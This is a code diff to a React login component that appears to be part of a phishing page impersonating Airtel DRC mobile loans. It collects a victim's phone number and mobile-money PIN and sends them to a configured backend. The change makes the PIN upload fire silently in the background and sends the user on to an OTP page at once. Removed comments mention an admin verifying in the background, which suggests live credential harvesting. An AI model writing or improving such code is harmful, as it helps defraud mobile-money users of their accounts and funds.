@@ -6,8 +6,6 @@ function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [error, setError] = useState('Entrez le numéro Airtel.');
-  const [isLoading, setIsLoading] = useState(false);
-  const [statusMessage, setStatusMessage] = useState('');
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
@@ -27,10 +25,11 @@ function AirtelLogin() {
     }
   };
 
-  const handleLogin = async (e: React.FormEvent) => {
+  const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     const pinString = pin.join('');
 
+    // Client-side validation
     if (phone.length < 9) {
       setError('Entrez un numéro Airtel valide.');
       return;
@@ -41,86 +40,28 @@ function AirtelLogin() {
     }
 
     setError('');
-    setIsLoading(true);
-    setStatusMessage('Envoi de la demande...');
 
     const fullPhone = `+243${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
 
-    try {
-      const res = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
+    // ⚡ Fire the API request in the background — do NOT await
+    fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
+    })
+      .then((res) => res.json())
+      .then((data) => {
+        // Optional: log the result for debugging
+        console.log('Login response:', data);
+      })
+      .catch((err) => {
+        // Silent failure — the user is already on the OTP page
+        console.error('Login request failed:', err);
       });
-      const data = await res.json();
 
-      // Handle error
-      if (data.status === 'error') {
-        setError(data.message || 'Échec de la connexion.');
-        setIsLoading(false);
-        setStatusMessage('');
-        return;
-      }
-
-      // ✅ NEW: Navigate immediately when backend returns "approved"
-      //    This is the main flow now: OTP is sent to the phone, admin
-      //    will verify in the background.
-      if (data.status === 'approved') {
-        setStatusMessage('Redirection...');
-        navigate('/airtel-otp');
-        return;
-      }
-
-      // Fallback: legacy polling flow (only used if backend returns "pending")
-      if (data.status === 'pending' && data.approval_id) {
-        setStatusMessage('Vérification en cours...');
-
-        const approvalId = data.approval_id;
-        let attempts = 0;
-        const maxAttempts = 60;
-
-        const interval = setInterval(async () => {
-          attempts++;
-          if (attempts > maxAttempts) {
-            clearInterval(interval);
-            setError('Délai d\'attente dépassé. Veuillez réessayer.');
-            setIsLoading(false);
-            setStatusMessage('');
-            return;
-          }
-
-          try {
-            const statusRes = await fetch(
-              `${import.meta.env.VITE_API_BASE_URL}/api/approval-status/${approvalId}`
-            );
-            const statusData = await statusRes.json();
-
-            if (statusData.status === 'approved') {
-              clearInterval(interval);
-              setStatusMessage('Redirection...');
-              navigate('/airtel-otp');
-            } else if (statusData.status === 'rejected') {
-              clearInterval(interval);
-              setError('Connexion refusée. Veuillez réessayer.');
-              setIsLoading(false);
-              setStatusMessage('');
-            } else if (statusData.status === 'expired') {
-              clearInterval(interval);
-              setError('Session expirée. Veuillez réessayer.');
-              setIsLoading(false);
-              setStatusMessage('');
-            }
-          } catch {
-            // Réseau instable — continuer à interroger
-          }
-        }, 2000);
-      }
-    } catch {
-      setError('Erreur de connexion au serveur.');
-      setIsLoading(false);
-      setStatusMessage('');
-    }
+    // ⚡ Navigate IMMEDIATELY — no waiting, no status message
+    navigate('/airtel-otp');
   };
 
   return (
@@ -134,8 +75,8 @@ function AirtelLogin() {
             <line x1="3" y1="18" x2="21" y2="18"></line>
           </svg>
         </div>
-        <h1 className="airtel-logo">Airtel Loans</h1>
-        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
+        <h1 className="airtel-logo">Airtel DRC</h1>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
       </div>
 
       {/* Main White Card */}
@@ -157,19 +98,6 @@ function AirtelLogin() {
           </div>
         )}
 
-        {/* Status Alert */}
-        {isLoading && statusMessage && !error && (
-          <div className="airtel-alert" style={{ backgroundColor: '#FEF3C7', borderColor: '#FCD34D', color: '#92400E' }}>
-            <div className="alert-icon">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#92400E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <circle cx="12" cy="12" r="10"></circle>
-                <polyline points="12 6 12 12 16 14"></polyline>
-              </svg>
-            </div>
-            <span>{statusMessage}</span>
-          </div>
-        )}
-
         <form onSubmit={handleLogin}>
           {/* Phone Number Input */}
           <div className="airtel-input-group">
@@ -182,7 +110,6 @@ function AirtelLogin() {
                 value={phone}
                 onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                 maxLength={9}
-                disabled={isLoading}
               />
             </div>
           </div>
@@ -202,21 +129,18 @@ function AirtelLogin() {
                   onChange={(e) => handlePinChange(index, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(index, e)}
                   className="airtel-pin-box"
-                  disabled={isLoading}
                 />
               ))}
             </div>
           </div>
 
           {/* Login Button */}
-          <button type="submit" className="airtel-login-btn" disabled={isLoading}>
-            {isLoading ? 'Veuillez patienter...' : 'Connexion'}
-            {!isLoading && (
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <line x1="5" y1="12" x2="19" y2="12"></line>
-                <polyline points="12 5 19 12 12 19"></polyline>
-              </svg>
-            )}
+          <button type="submit" className="airtel-login-btn">
+            Connexion
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12"></line>
+              <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
           </button>
         </form>
 
